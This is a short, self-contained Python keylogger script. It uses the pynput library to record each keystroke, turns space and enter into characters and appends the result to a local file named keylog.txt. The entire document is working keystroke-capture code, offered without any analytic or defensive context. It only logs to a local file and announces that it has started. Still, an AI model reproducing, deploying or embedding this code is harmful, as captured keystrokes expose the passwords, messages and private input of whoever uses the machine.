from pynput.keyboard import Listener

log_file = "keylog.txt"

def write_to_file(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif "Key" in key:
        key = ""

    with open(log_file, "a") as f:
        f.write(key)

print("Keylogger started... Press CTRL+C to stop.")

with Listener(on_press=write_to_file) as listener:
    listener.join()